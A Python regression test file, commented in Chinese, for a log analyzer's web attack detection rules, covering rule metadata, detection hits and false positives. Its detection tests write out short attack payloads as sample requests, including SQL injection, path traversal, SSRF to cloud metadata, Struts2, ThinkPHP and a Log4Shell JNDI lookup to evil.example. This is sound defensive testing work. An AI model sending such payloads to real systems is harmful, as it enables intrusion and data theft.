"""Regression tests for the externalized Web attack rule library.

v1.4.5 起，命名 Web 攻击检测统一由 ``bla/rules/web_attacks.yaml`` 提供。这里覆盖
三类回归：
  1. 规则库完整性（唯一 id、合法 MITRE、必填元数据、严格校验全绿）；
  2. 每条 HVV/通用规则在代表性恶意 payload 上命中；
  3. 良性流量不被这些规则误判。
"""
from _support import *  # noqa: F401,F403

from bla.rules import get_web_attack_rules
from bla.rules.loader import _MITRE_ID_RE


def _web_event(request: str, status: int = 200, ua: str = "curl/8"):
    line = (
        f'1.2.3.4 - - [15/Mar/2024:10:00:00 +0800] "{request}" '
        f'{status} 10 "-" "{ua}"\n'
    )
    return parse_web_access(line, "access.log").events


class WebRuleLibraryTests(unittest.TestCase):
    def test_rule_library_metadata_is_strict_clean(self):
        report = validate_web_attack_rules()
        self.assertEqual(report["errors"], 0, report["issues"])
        self.assertEqual(report["warnings"], 0, report["issues"])
        self.assertGreaterEqual(report["raw_rules"], 25)

    def test_rule_ids_are_unique_and_well_formed(self):
        rules = get_web_attack_rules()
        self.assertTrue(rules)
        ids = [rule.rule_id for rule in rules]
        # 同一规则可展开多个 pattern（共享 id），这里按规则名+id 去重后校验 id 命名。
        for rule in rules:
            self.assertTrue(rule.rule_id.startswith("WEB-"), rule.rule_id)
            self.assertTrue(_MITRE_ID_RE.fullmatch(rule.mitre), (rule.rule_id, rule.mitre))
            self.assertTrue(rule.name, rule.rule_id)
        # 每个 id 只应对应一个规则名，避免 id 复用造成告警归因混乱。
        name_by_id = {}
        for rule in rules:
            self.assertEqual(name_by_id.setdefault(rule.rule_id, rule.name), rule.name)
        self.assertIn("WEB-SQLI-001", set(ids))


class WebRuleDetectionTests(unittest.TestCase):
    def _assert_rule(self, request, expected_rule_id, ua="curl/8"):
        events = _web_event(request, ua=ua)
        self.assertTrue(events, f"no event for {request!r}")
        rule_ids = {e.rule_id for e in events}
        self.assertIn(expected_rule_id, rule_ids, f"{request!r} -> {rule_ids}")
        self.assertTrue(any("web-attack" in e.tags for e in events))

    def test_sqli(self):
        self._assert_rule("GET /item?id=1 union select 1,2,3 HTTP/1.1", "WEB-SQLI-001")

    def test_path_traversal(self):
        self._assert_rule("GET /down?f=../../etc/hosts HTTP/1.1", "WEB-PATH-TRAVERSAL-001")

    def test_shiro(self):
        self._assert_rule("GET /shiro/login?rememberMe=deleteMe HTTP/1.1", "WEB-SHIRO-001")

    def test_fastjson(self):
        self._assert_rule("GET /api?data=@type:com.sun.rowset.JdbcRowSetImpl HTTP/1.1", "WEB-FASTJSON-001")

    def test_struts2(self):
        self._assert_rule(
            "GET /index.action?redirect:%24%7B%23_memberAccess HTTP/1.1", "WEB-STRUTS2-001"
        )

    def test_thinkphp(self):
        self._assert_rule(
            "GET /index.php?s=index/think/invokefunction&function=call_user_func HTTP/1.1",
            "WEB-THINKPHP-001",
        )

    def test_weblogic(self):
        self._assert_rule("POST /wls-wsat/CoordinatorPortType HTTP/1.1", "WEB-WEBLOGIC-001")

    def test_spring_actuator(self):
        self._assert_rule("GET /actuator/heapdump HTTP/1.1", "WEB-SPRING-001")

    def test_java_deserialize(self):
        self._assert_rule("GET /api?d=ysoserial-CommonsCollections HTTP/1.1", "WEB-JAVA-DESERIALIZE-001")

    def test_xxe(self):
        self._assert_rule("GET /parse?xml=<!ENTITY%20x HTTP/1.1", "WEB-XXE-001")

    def test_ssrf_cloud_metadata(self):
        self._assert_rule(
            "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1", "WEB-SSRF-001"
        )

    def test_unauth_endpoint(self):
        self._assert_rule("GET /druid/index.html HTTP/1.1", "WEB-UNAUTH-ACCESS-001")

    def test_oa_exploit(self):
        self._assert_rule("GET /weaver/bsh.servlet.BshServlet HTTP/1.1", "WEB-OA-EXPLOIT-001")

    def test_scanner_ua(self):
        self._assert_rule("GET /robots.txt HTTP/1.1", "WEB-SCANNER-001", ua="sqlmap/1.7")

    def test_log4shell(self):
        self._assert_rule(
            "GET /a?x=${jndi:ldap://evil.example/a} HTTP/1.1", "WEB-LOG4SHELL-001"
        )


class WebRuleFalsePositiveTests(unittest.TestCase):
    def _attack_events(self, request, ua="Mozilla/5.0"):
        events = _web_event(request, ua=ua)
        return [e for e in events if "web-attack" in e.tags]

    def test_benign_api_request_not_flagged(self):
        self.assertEqual(self._attack_events("GET /api/users?id=123&page=2 HTTP/1.1"), [])

    def test_benign_static_asset_not_flagged(self):
        self.assertEqual(self._attack_events("GET /static/js/app.min.js HTTP/1.1"), [])

    def test_benign_article_query_not_flagged(self):
        self.assertEqual(self._attack_events("GET /article?id=42&lang=zh HTTP/1.1"), [])


if __name__ == "__main__":
    unittest.main()
